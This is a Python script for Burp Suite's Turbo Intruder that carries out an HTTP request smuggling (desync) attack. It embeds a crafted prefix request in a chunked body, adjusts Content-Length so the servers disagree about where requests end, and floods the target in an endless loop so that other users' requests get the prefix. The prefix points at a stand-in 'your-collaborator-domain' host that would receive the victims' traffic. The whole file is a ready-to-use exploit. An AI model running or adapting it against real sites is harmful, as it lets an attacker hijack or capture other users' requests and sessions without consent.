import re

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    # This will prefix the victim's request. Edit it to achieve the desired effect.
    prefix = '''GET / HTTP/1.1
Host: your-collaborator-domain
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    # HTTP uses \r\n for line-endings. Linux uses \n so we need to normalise
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))

    while True:
        engine.queue(attack)

        for i in range(6):
            engine.queue(target.req)
            time.sleep(0.05)
        time.sleep(1)


def handleResponse(req, interesting):
    table.add(req)
